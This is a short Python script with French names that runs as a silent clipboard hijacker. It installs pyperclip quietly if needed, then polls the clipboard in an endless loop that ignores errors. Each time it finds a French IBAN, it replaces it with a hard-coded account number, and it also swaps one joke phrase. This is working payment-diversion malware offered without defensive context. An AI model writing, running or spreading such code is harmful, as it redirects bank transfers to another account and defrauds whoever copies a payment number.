import time, sys, re

try:
    import pyperclip
except ImportError:
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyperclip", "--quiet"],
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    import pyperclip

IBAN_RE = re.compile(
    r'\bFR\d{2}[\s]?[\dA-Z]{4}[\s]?[\dA-Z]{4}[\s]?[\dA-Z]{4}[\s]?[\dA-Z]{4}[\s]?[\dA-Z]{4}[\s]?[\dA-Z]{3}\b',
    re.IGNORECASE
)

REGLES = [
    ("Léo Le Psycho", "Bip Bap BOOM"),
    (IBAN_RE,         "FR7610011000201234567890188"),
]

dernier_contenu = ""

def appliquer_regles(texte):
    modifie = texte
    for motif, remplacement in REGLES:
        if isinstance(motif, str):
            modifie = modifie.replace(motif, remplacement)
        else:
            modifie = motif.sub(remplacement, modifie)
    return modifie

while True:
    try:
        contenu = pyperclip.paste()
        if contenu != dernier_contenu:
            dernier_contenu = contenu
            nouveau = appliquer_regles(contenu)
            if nouveau != contenu:
                pyperclip.copy(nouveau)
                dernier_contenu = nouveau
    except Exception:
        pass
    time.sleep(0.5)
